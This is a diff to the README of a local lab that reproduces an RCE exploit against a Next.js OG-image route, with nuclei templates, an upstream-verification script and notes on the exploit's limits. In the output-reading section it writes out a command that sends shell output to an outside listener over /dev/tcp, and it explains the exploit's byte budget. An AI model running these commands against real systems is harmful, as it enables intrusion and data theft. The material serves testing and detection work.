@@ -24,6 +24,7 @@ lab/
 ├── run-tests.sh        run both templates against both builds -> PASS/FAIL summary
 ├── oob-listener.py     catches the exploit's blind callback
 ├── app/                the test app (route + version endpoint + console)
+├── check-upstream.sh   diff lab/app against the advisory's published app
 └── tools/
     ├── nuclei-shim.mjs offline runner for nuclei JS-protocol templates
     ├── http-fetch.mjs  one-shot HTTP helper used by the shim
@@ -45,6 +46,43 @@ vulnerable worker).
 Open <http://127.0.0.1:3000> for the target's index, <http://127.0.0.1:3000/lab> for an
 interactive console where you can paste a payload and watch the PNG size, and
 <http://127.0.0.1:3000/api/lab-info> for the exact library versions in use.
+
+### The app is the advisory's app
+
+`lab/app` is the victim application published in
+[EQSTLab/CVE-2026-94545](https://github.com/EQSTLab/CVE-2026-94545/tree/main/app), with two
+additions that do not touch the vulnerable path: a version endpoint (`/api/lab-info`) and a
+browser console (`/lab`). `check-upstream.sh` re-verifies that against the live upstream
+repository — dependencies, the Node runtime pin, the request shapes, and the fact that the
+request value is what lands in the SVG `<title>`:
+
+```bash
+$ ./check-upstream.sh
+dependency versions (upstream -> lab)
+  ok  next         16.3.5     16.3.5
+  ok  react        19.3.0     19.3.0
+  ok  sharp        0.35.4     0.35.4
+OG route
+  ok  runtime pinned to nodejs         upstream=True  lab=True
+  ok  POST body is the title text      upstream=True  lab=True
+  ok  GET ?value= is the title text    upstream=True  lab=True
+  ok  value placed in SVG <title>      upstream=True  lab=True
+RESULT: lab/app matches the upstream victim app on everything that matters
+```
+
+If you would rather scan the published image instead of this lab, build it and point the
+templates at it — the checks above are what the templates depend on, so the results transfer:
+
+```bash
+git clone https://github.com/EQSTLab/CVE-2026-94545 && cd CVE-2026-94545
+docker build -t cve-2026-94545 . && docker run -d --name cve-2026-94545 -p 3000:3000 cve-2026-94545
+./run-nuclei.sh http://127.0.0.1:3000          # from this lab directory
+```
+
+On a container the exploit takes the container down with it: `entrypoint.sh` ends in
+`exec node …`, so Node is PID 1 and replacing that process ends the container. `sudo docker
+ps -a` will show it exited - that is a successful exploit, and `sudo docker start
+cve-2026-94545` brings it back.
 
 ## What the suite verifies
 
@@ -239,6 +277,28 @@ then `docker run -d -p 3000:3000 cve-2026-94545`):
 If the target's worker is replaced by the exploit, `./start.sh --restart vulnerable`
 brings it back.
 
+### Reading the command output
+
+Interactsh proves execution (DNS + TCP interaction), but it is a correlation service, not a
+place to read stdout. Two ways to actually capture what the command printed:
+
+```bash
+# 1) lab listener: the default command already pipes `id` into the callback
+./run-nuclei.sh http://127.0.0.1:3000 --oast 127.0.0.1:4444
+cat oob-hits.log
+#   2026-09-29T14:0x:xx from=127.0.0.1:xxxxx bytes=68 data=uid=1001(user) gid=1001(user) ...
+
+# 2) send the output as an HTTP request to your own listener (respects the 71-byte
+#    command budget; point HOST:PORT at a machine you control)
+nuclei -u http://127.0.0.1:3000 -t CVE-2026-94545-rce.yaml \
+       -var 'cmd=bash -c "id>/dev/tcp/HOST/PORT"'
+```
+
+The 71-byte limit comes from the overflow itself: the command has to fit in the space the
+ROP chain leaves. `bash -c "id>/dev/tcp/HOST/PORT"` costs roughly 33 bytes plus the host, so
+short hosts (an IP address, a short domain) leave room for a little shell logic. Longer
+commands need an uploader-plus-fetcher stager, which is out of budget for this bug.
+
 ### Why there is also a shim
 
 This machine has no Go toolchain and cannot download a nuclei release binary, so the
@@ -276,10 +336,11 @@ vendored from the nuclei repository), and a `new Function()` syntax check of eve
 * The non-PIE requirement is real: `setup.sh` reads the ELF header of the Node binary and
   aborts if it is not `ET_EXEC`, because every gadget address in the template is pinned to
   that layout.
-* Next 16.3.5 and 16.3.6 ship the same `@vercel/og@0.11.1` wrapper, but the bundled satori
-  build differs: 16.3.6 routes text through `escape-html` (the bundle imports it twice),
-  16.3.5 does not. `/api/lab-info` reports this as `"escaping"`, which is what decides
-  whether the injected `xi:include` survives into the SVG.
+* Both builds tested here (Next 16.3.5 and 16.3.6 from npm) ship the same `@vercel/og@0.11.1`
+  wrapper, and both bundle satori 0.25.0 — but 16.3.6's generated OG bundle routes text
+  through `escape-html` where 16.3.5's does not. That is an observation about the builds
+  installed here, not a published advisory detail; `/api/lab-info` reports it as `"escaping"`,
+  and it is what decides whether the injected `xi:include` survives into the SVG.
 * The bug is only reachable on the Node runtime with `sharp` present. Removing `sharp` or
   switching the route to the Edge runtime puts `resvg-wasm` in the path and the injection
   becomes inert — the detection template reports no match there, which is the third
